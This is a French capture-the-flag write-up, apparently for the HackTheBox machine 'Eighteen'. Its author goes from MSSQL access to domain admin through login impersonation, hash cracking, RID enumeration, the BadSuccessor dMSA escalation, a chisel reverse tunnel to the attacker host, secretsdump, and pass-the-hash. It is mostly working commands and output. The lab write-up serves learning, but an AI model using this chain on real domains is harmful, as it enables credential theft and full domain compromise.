@@ -1,0 +1,332 @@
+Bon classique, nmappppp
+nmap -p- -A -sV 10.10.11.95
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-20 09:15 EST
+Nmap scan report for eighteen.htb (10.10.11.95)
+Host is up (0.026s latency).
+Not shown: 65532 filtered tcp ports (no-response)
+PORT     STATE SERVICE  VERSION
+80/tcp   open  http     Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Welcome - eighteen.htb
+1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
+| ms-sql-info: 
+|   10.10.11.95:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2022 RTM
+|       number: 16.00.1000.00
+|       Product: Microsoft SQL Server 2022
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| ms-sql-ntlm-info: 
+|   10.10.11.95:1433: 
+|     Target_Name: EIGHTEEN
+|     NetBIOS_Domain_Name: EIGHTEEN
+|     NetBIOS_Computer_Name: DC01
+|     DNS_Domain_Name: eighteen.htb
+|     DNS_Computer_Name: DC01.eighteen.htb
+|     DNS_Tree_Name: eighteen.htb
+|_    Product_Version: 10.0.26100
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2025-11-20T20:54:26
+|_Not valid after:  2055-11-20T20:54:26
+|_ssl-date: 2025-11-20T21:20:50+00:00; +7h00m18s from scanner time.
+5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022|2012 (87%)
+OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2
+Aggressive OS guesses: Microsoft Windows Server 2022 (87%), Microsoft Windows Server 2012 R2 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 7h00m18s, deviation: 0s, median: 7h00m17s
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT      ADDRESS
+1   21.77 ms 10.10.14.1
+2   21.84 ms eighteen.htb (10.10.11.95)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 302.84 seconds
+
+Sur le port 80 on arrive directement sur une page qui ressemble a une banque (avec des fonctionnalité de login de register et autre...), la faille est donc surement dans une des fonctionnalité il faut plus explorer (img: sc/openpage.jpg)
+
+dans le formulaire de register je tombes sur une erreur sql directement forward vers l'user, cela sent la faille sql (img: sc/sqlerror.jpg)
+
+J'ai ce mdp/user donné par le sujet kevin:iNa2we6haRj2gaw! (J'avais completement oublié MDRRRRRRRRRRR)
+je me connecte donc 
+└─$ impacket-mssqlclient 'kevin:iNa2we6haRj2gaw!'@eighteen.htb 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01): Line 1: Changed database context to 'master'.
+[*] INFO(DC01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
+[!] Press help for extra shell commands
+SQL (kevin  guest@master)>
+
+SQL (kevin  guest@master)> enum_db
+name                is_trustworthy_on   
+-----------------   -----------------   
+master                              0   
+
+tempdb                              0   
+
+model                               0   
+
+msdb                                1   
+
+financial_planner                   0   
+
+SQL (kevin  guest@master)> use financial_planner;
+ERROR(DC01): Line 1: The server principal "kevin" is not able to access the database "financial_planner" under the current security context.
+
+Malheureusement je ne peux pas me utiliser la db financial_planner qui m'interresse
+je regarde si je peux pas impersonate
+
+SQL (kevin  guest@master)> enum_impersonate
+execute as   database   permission_name   state_desc   grantee   grantor   
+----------   --------   ---------------   ----------   -------   -------   
+b'LOGIN'     b''        IMPERSONATE       GRANT        kevin     appdev    
+
+effectivement je peux
+
+SQL (appdev  appdev@financial_planner)> SELECT name FROM sys.tables;
+name          
+-----------   
+users         
+
+incomes       
+
+expenses      
+
+allocations   
+
+analytics     
+
+visits        
+
+SQL (appdev  appdev@financial_planner)> SELECT * FROM users;
+  id   full_name   username   email                password_hash                                                                                            is_admin   created_at   
+----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------   
+1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:260000$tfArqWh1qKQ0EOv2$e235919a063c6b3dcc5da384f80a78cdb7210896b9335a587f1632b16e83e32b          1   2025-10-29 05:39:03   
+
+je me suis rajouté en tant qu'admin mais il n'y a pas grand chose d'interresant dans la page admin Database: MSSQL (dc01.eighteen.htb)
+J'essaye de crack le mdp mais j'ai pas grand chose,
+
+Le mdp admin me semblait vraiment etre la cible (sinon pk me donner l'impersonate), et après avoir plus cherché je suis tombé sur 
+https://github.com/hashcat/hashcat/issues/3205
+un gars dit:
+Finally found the format from this library:
+pbkdf2:sha256:260000$mi85l7RleKJWS7Pk$b60dae677bf794178d5f6259b89e73ce363ce574c75b02bc12e23e7687446f97
+(password for above is Password1!)
+corresponds to:
+pbkdf2:sha256:[ITERATIONS]$[RAW SALT EVEN THOUGH IT LOOKS BASE64]$[HEXDIGEST OF pbkdf2 sha256 hmac]
+
+un mec donne meme un petit script pour convertir
+
+hashcat me donne
+sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=:iloveyou1
+bon je peux utiliser evil-winrm car le mdp est dispo mais je ne sais pas avec quel user, j'énumere donc les users avec msfconsole
+
+[*] 10.10.11.95:1433 - Brute forcing 10000 RIDs through the SQL Server, be patient...
+[*] 10.10.11.95:1433 -  - F4010000 EIGHTEEN\Administrator
+[*] 10.10.11.95:1433 -  - F5010000 EIGHTEEN\Guest
+[*] 10.10.11.95:1433 -  - F6010000 EIGHTEEN\krbtgt
+[*] 10.10.11.95:1433 -  - 00020000 EIGHTEEN\Domain Admins
+[*] 10.10.11.95:1433 -  - 01020000 EIGHTEEN\Domain Users
+[*] 10.10.11.95:1433 -  - 02020000 EIGHTEEN\Domain Guests
+[*] 10.10.11.95:1433 -  - 03020000 EIGHTEEN\Domain Computers
+[*] 10.10.11.95:1433 -  - 04020000 EIGHTEEN\Domain Controllers
+[*] 10.10.11.95:1433 -  - 05020000 EIGHTEEN\Cert Publishers
+[*] 10.10.11.95:1433 -  - 06020000 EIGHTEEN\Schema Admins
+[*] 10.10.11.95:1433 -  - 07020000 EIGHTEEN\Enterprise Admins
+[*] 10.10.11.95:1433 -  - 08020000 EIGHTEEN\Group Policy Creator Owners
+[*] 10.10.11.95:1433 -  - 09020000 EIGHTEEN\Read-only Domain Controllers
+[*] 10.10.11.95:1433 -  - 0A020000 EIGHTEEN\Cloneable Domain Controllers
+[*] 10.10.11.95:1433 -  - 0D020000 EIGHTEEN\Protected Users
+[*] 10.10.11.95:1433 -  - 0E020000 EIGHTEEN\Key Admins
+[*] 10.10.11.95:1433 -  - 0F020000 EIGHTEEN\Enterprise Key Admins
+[*] 10.10.11.95:1433 -  - 10020000 EIGHTEEN\Forest Trust Accounts
+[*] 10.10.11.95:1433 -  - 11020000 EIGHTEEN\External Trust Accounts
+[*] 10.10.11.95:1433 -  - 29020000 EIGHTEEN\RAS and IAS Servers
+[*] 10.10.11.95:1433 -  - 3B020000 EIGHTEEN\Allowed RODC Password Replication Group
+[*] 10.10.11.95:1433 -  - 3C020000 EIGHTEEN\Denied RODC Password Replication Group
+[*] 10.10.11.95:1433 -  - E8030000 EIGHTEEN\DC01$
+[*] 10.10.11.95:1433 -  - 4D040000 EIGHTEEN\DnsAdmins
+[*] 10.10.11.95:1433 -  - 4E040000 EIGHTEEN\DnsUpdateProxy
+[*] 10.10.11.95:1433 -  - 41060000 EIGHTEEN\mssqlsvc
+[*] 10.10.11.95:1433 -  - 42060000 EIGHTEEN\SQLServer2005SQLBrowserUser$DC01
+[*] 10.10.11.95:1433 -  - 43060000 EIGHTEEN\HR
+[*] 10.10.11.95:1433 -  - 44060000 EIGHTEEN\IT
+[*] 10.10.11.95:1433 -  - 45060000 EIGHTEEN\Finance
+[*] 10.10.11.95:1433 -  - 46060000 EIGHTEEN\jamie.dunn
+[*] 10.10.11.95:1433 -  - 47060000 EIGHTEEN\jane.smith
+[*] 10.10.11.95:1433 -  - 48060000 EIGHTEEN\alice.jones
+[*] 10.10.11.95:1433 -  - 49060000 EIGHTEEN\adam.scott
+[*] 10.10.11.95:1433 -  - 4A060000 EIGHTEEN\bob.brown
+[*] 10.10.11.95:1433 -  - 4B060000 EIGHTEEN\carol.white
+[*] 10.10.11.95:1433 -  - 4C060000 EIGHTEEN\dave.green
+
+a force de tester un par un un, un user marche adam.scott:iloveyou1
+une personne ayant laissé un exe nommé BadSuccessor dans la machine me mets sur une piste que je connaissais pas. je vais faire une machine tryhackme pour m'entrainer et apprendre puis je reviens
+okk alors c'était très peu theorique, très pratique. De ce que j'ai compris on peut creer un compte machine qui va succeder a un autre compte, on peut lui dire de succeder a l'administrateur pour recuperer ses droits et agir en son nom, il y a pleins de subtilitées qui m'échappent mais ça me suffit pour l'instant pour reussir cette box (ça fait trop longtemps que je suis dessus)
+
+J'utilise ces tools
+https://github.com/logangoins/SharpSuccessor/tree/master (pour creer le dMSA)
+https://github.com/akamai/BadSuccessor (pour tester si je peux)
+https://github.com/GhostPack/Rubeus (pour gerer kerberos)
+
+*Evil-WinRM* PS C:\Users\adam.scott\Documents> ./Get-BadSuccessorOUPermissions.ps1
+
+Identity    OUs
+--------    ---
+EIGHTEEN\IT {OU=Staff,DC=eighteen,DC=htb}
+
+le script de detection me dit que je peux executer cette attaque (adam.scott fait parti de IT)
+
+./SharpSuccessor.exe add /path:"OU=Staff,DC=eighteen,DC=htb" /account:adam.scott /name:evil_dmsa /impersonate:Administrator
+./Invoke-BadSuccessor.ps1 -Domain eighteen.htb -OU Staff -LinkTargetDN "CN=ADMINISTRATOR,CN=USERS,DC=EIGHTEEN,DC=HTB" -LowPrivUser "EIGHTEEN/adam.scott" -TargetHost "DC01.eighteen.htb"
+
+après avoir été bloqué sur cette strat pendant des jours je vais chercher des indices sur une chaine youtube qui en donne
+
+Hints video:
+regarder les CVE récents
+forward les ports avec chisel
+luemmelSec github
+convertir le ticket en local ticket converter impacket
+
+Pour l'exploit:
+https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/2899fbfb55a116895552d4a8d95dc91b30ed4c31/tools/ActiveDirectory/BadSuccessor.ps1#L4
+
+j'utilise chisel pour forward les ports de keberos:
+
+# atacker
+chisel server -p 8000 --reverse
+
+# victim
+.\chisel.exe client 10.10.14.20:8000 R:88:127.0.0.1:88
+
+impacket-getST -impersonate 'bad_DMSA$' -dmsa -k eighteen.htb/adam.scott -dc-ip 127.0.0.1 -self
+
+┌──(kali㉿kali)-[~/Documents/utils]
+└─$ evil-winrm -i eighteen.htb -u adam.scott -p iloveyou1
+*Evil-WinRM* PS C:\Users\adam.scott\Documents> ls
+
+
+    Directory: C:\Users\adam.scott\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         12/5/2025   3:32 PM                DSInternals
+-a----         12/5/2025   3:59 PM          19968 BadSuccessor.exe
+-a----         12/5/2025   4:34 PM          16721 BadSuccessor.ps1
+-a----         12/5/2025   4:04 PM       10131968 chisel.exe
+-a----         12/5/2025   3:30 PM          25553 DSInternals.psd1
+-a----         12/5/2025   3:31 PM         455372 Invoke-Rubeus.ps1
+-a----         12/5/2025   4:27 PM         462848 Rubeus.exe
+
+
+*Evil-WinRM* PS C:\Users\adam.scott\Documents> import-module ./badsuccessor.ps1
+*Evil-WinRM* PS C:\Users\adam.scott\Documents> BadSuccessor -mode exploit -Path "OU=Staff,DC=EIGHTEEN,DC=HTB" -Name "bad_DMSA" -DelegatedAdmin "adam.scott" -DelegateTarget "Administrator" -domain "eighteen.htb"
+Creating dMSA at: LDAP://eighteen.htb/OU=Staff,DC=EIGHTEEN,DC=HTB
+0
+0
+0
+0
+Successfully created and configured dMSA 'bad_DMSA'
+Object adam.scott can now impersonate Administrator
+*Evil-WinRM* PS C:\Users\adam.scott\Documents> .\chisel.exe client 10.10.14.20:8000 R:88:127.0.0.1:88 R:389:127.0.0.1:389
+chisel.exe : 2025/12/05 18:29:27 client: Connecting to ws://10.10.14.20:8000
+    + CategoryInfo          : NotSpecified: (2025/12/05 18:2...0.10.14.20:8000:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+2025/12/05 18:29:27 client: Connected (Latency 19.5843ms)
+
+──(kali㉿kali)-[~/Documents/eighteen]
+└─$ faketime 20:41 impacket-getTGT eighteen.htb/adam.scott:iloveyou1 -dc-ip 127.0.0.1 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in adam.scott.ccache
+
+finalement avec le --self et le tgt j'ai le service ticket (jsp comment j'ai fait pour passer a coté jusque là)
+
+export KRB5CCNAME="./adam.scott.ccache"; faketime 21:01 impacket-getST -impersonate 'bad_DMSA$' -dmsa -k -no-pass eighteen.htb/adam.scott -self -dc-ip 127.0.0.1 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Impersonating bad_DMSA$
+[*] Requesting S4U2self
+[*] Current keys:
+[*] EncryptionTypes.aes256_cts_hmac_sha1_96:476bdd3dd14295cc12ad6e6b859226ca03c088820c3187030b1874f94c86cc4d
+[*] EncryptionTypes.aes128_cts_hmac_sha1_96:59f29f2ac7d670b30ecdc30614cf044b
+[*] EncryptionTypes.rc4_hmac:a30edefb23579ac6d8ac68be004dd420
+[*] Previous keys:
+[*] EncryptionTypes.rc4_hmac:0b133be956bfaddf9cea56701affddec
+[*] Saving ticket in bad_DMSA$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
+
+BINGO, il me reste plus qu'a extraire le NTLM hash de l'admin pour faire un pass the hash
+
+┌──(kali㉿kali)-[~/Documents/eighteen]
+└─$ export KRB5CCNAME=./bad_DMSA\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache; faketime 20:49 impacket-secretsdump -k -no-pass dc01.eighteen.htb -just-dc-user Administrator
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::
+[*] Kerberos keys grabbed
+Administrator:0x14:977d41fb9cb35c5a28280a6458db3348ed1a14d09248918d182a9d3866809d7b
+Administrator:0x13:5ebe190ad8b5efaaae5928226046dfc0
+Administrator:aes256-cts-hmac-sha1-96:1acd569d364cbf11302bfe05a42c4fa5a7794bab212d0cda92afb586193eaeb2
+Administrator:aes128-cts-hmac-sha1-96:7b6b4158f2b9356c021c2b35d000d55f
+Administrator:0x17:0b133be956bfaddf9cea56701affddec
+[*] Cleaning up... 
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/eighteen]
+└─$ evil-winrm -i dc01.eighteen.htb -u Administrator -H '0b133be956bfaddf9cea56701affddec'                    
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
+
+
+    Directory: C:\Users\Administrator\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        10/29/2025   5:40 AM           1226 clean_OU.ps1
+-a----         11/8/2025   7:18 AM            421 warmup_flask.ps1
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         12/9/2025   9:53 AM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+312c19b051cbc05a4380331185aba197
+
+
+FINIS !
+
+Bilan: Ça devais me prendre une journée ça m'a pris DEUX SEMAINES ET DEMI, le début jusqu'a l'user flag était assez directe et simple (si on ignore le rabithole du site de merde qui bug), après ne connaissant pas badsuccessor je me suis epuisé sur des pistes innutiles pendant plusieurs jours, j'ai aussi galéré a tout bien comprendre pour faire fonctionner badSuccessor, j'ai galéré plusieurs jour a chercher quel était le bon spn a target + a compendre qu'il me fallait le tgt avant + forward les ports avec chisel/ligolo. Bon je suis bien fatigué et je suis en retard sur mon schedule de machines a faire mais de 1) ça a entrainé ma résistance a la frustration 2) j'ai beaucoup appris sur les machines windows et sur l'outil ligolo-ng (et chisel) que je trouves incroyable et qui me sera bien utile par la suite
